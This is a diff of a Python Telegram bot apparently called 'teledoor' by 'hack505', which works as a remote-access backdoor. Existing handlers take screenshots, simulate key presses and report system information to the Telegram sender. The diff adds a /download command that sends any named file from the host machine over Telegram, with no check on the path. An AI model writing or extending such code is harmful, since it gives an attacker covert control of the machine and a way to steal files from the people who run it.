@@ -1,7 +1,10 @@
 import telegram.ext
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+from telegram import Update
+import os
 import pyautogui
 import datetime
-import os
+# import os
 import subprocess
 import random
 import socket
@@ -54,7 +57,8 @@ def take_screenshot():
 
 
 def start(update, context):
-    update.message.reply_text("Hello! welcoming you to hack505!")
+    update.message.reply_text(
+        "Hello! Welcoming you to Hack505 offical.it's Mark I")
 
 
 def help(update, context):
@@ -68,7 +72,7 @@ def help(update, context):
 
 def content(update, context):
     update.message.reply_text(
-        "here you can find the ulimate hacking tool for free of cost!")
+        "this project is owned by hack505. check out there github page- www.github.com/hack505")
 
 
 def screenshot(update, context):
@@ -79,9 +83,9 @@ def screenshot(update, context):
         update.message.reply_text(f"Error: {e}")
 
 
-def kamesh(update, context):
+def admin(update, context):
     update.message.reply_text(
-        "my name is kamesh")
+        "this bot is a part of teledoor project made by hack505 offical ")
 
 
 def handle_text(update, context):
@@ -166,13 +170,29 @@ def arrow_key(update, context):
         update.message.reply_text(f"Error: {e}")
 
 
+def download_requested_file(update: Update, context: CallbackContext) -> None:
+    UPLOAD_FOLDER = os.getcwd()
+    try:
+        # Extract the file name from the command
+        file_name = update.message.text[len('/download '):].strip()
+
+        # Check if the requested file exists
+        file_path = os.path.join(UPLOAD_FOLDER, file_name)
+        if os.path.exists(file_path):
+            # Send the requested file to the user who sent the command
+            update.message.reply_document(document=open(file_path, 'rb'))
+        else:
+            update.message.reply_text(f"File '{file_name}' not found.")
+    except Exception as e:
+        update.message.reply_text(f"Error: {e}")
+
+
 updater = telegram.ext.Updater(TOKEN, use_context=True)
 disp = updater.dispatcher
 
 disp.add_handler(telegram.ext.CommandHandler('start', start))
 disp.add_handler(telegram.ext.CommandHandler("help", help))
 disp.add_handler(telegram.ext.CommandHandler("content", content))
-disp.add_handler(telegram.ext.CommandHandler("kamesh", kamesh))
 # Add the new command handler
 disp.add_handler(telegram.ext.CommandHandler("screen", screenshot))
 disp.add_handler(telegram.ext.MessageHandler(
@@ -185,6 +205,7 @@ disp.add_handler(telegram.ext.CommandHandler("presskey", press_key))
 disp.add_handler(telegram.ext.MessageHandler(
     telegram.ext.Filters.regex(r'^/arrow\s'), arrow_key))
 disp.add_handler(telegram.ext.CommandHandler("sys", system_info))
+disp.add_handler(CommandHandler("download", download_requested_file))
 
 updater.job_queue.run_once(system_info, 0)
 
